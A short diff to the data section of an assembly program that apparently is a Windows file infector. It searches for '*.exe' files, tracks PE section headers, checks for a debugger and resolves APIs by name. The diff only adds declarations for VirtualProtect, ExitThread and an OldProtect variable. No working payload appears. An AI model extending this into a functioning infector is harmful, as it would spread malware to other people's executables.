@@ -2,6 +2,7 @@
 jmp	start
 
 ; FILE
+OldProtect		dd		?
 FileData		WIN32_FIND_DATA	<>
 DebugDone		db		"Done", 0 ; TODO remove
 SearchFolder		db		"*.exe", 0
@@ -37,6 +38,7 @@ PointerToRawData	dd	?
 CodeSecHeader		dd	?
 
 ; DLL
+sVirtualProtect		db	'VirtualProtect', 0 
 sCreateThread		db	'CreateThread', 0 
 sWaitForSingleObject	db	'WaitForSingleObject', 0 
 sIsDebuggerPresent	db	'IsDebuggerPresent', 0 
@@ -55,6 +57,7 @@ sWinHttpOpen	db	'WinHttpOpen', 0
 sWinHttpConnect	db	'WinHttpConnect', 0
 sGetSystemTime	db	'GetSystemTime', 0
 sExitProcess	db	'ExitProcess', 0 
+sExitThread	db	'ExitThread', 0 
 sCreateFile	db	'CreateFileA', 0 
 sMapViewOfFile	db	'MapViewOfFile', 0 
 sCloseHandle	db	'CloseHandle', 0 
@@ -68,6 +71,7 @@ sHelloWorld	db	'Hello World (MsgBox Without include lib BIATCH!)', 0
 sUser32		db	'USER32.DLL', 0
 sWinHttp	db	'WINHTTP.DLL', 0
 sKernel32	db	'KERNEL32.DLL', 0
+pVirtualProtect		dd	?
 pCreateThread		dd	?
 pWaitForSingleObject	dd	?
 pIsDebuggerPresent	dd	? 
@@ -86,6 +90,7 @@ pWinHttpOpen	dd	?
 pWinHttpConnect	dd	?
 pGetSystemTime	dd	?
 pExitProcess	dd	?
+pExitThread	dd	?
 pCreateFile	dd	?
 pMapViewOfFile	dd	?
 pCloseHandle	dd	?
@@ -128,5 +133,3 @@ STime		_SYSTEMTIME	<>
 
 ProcessInfo	PROCESS_INFORMATION	<0>
 StartupInfo	STARTUPINFOA		<0>
-
-
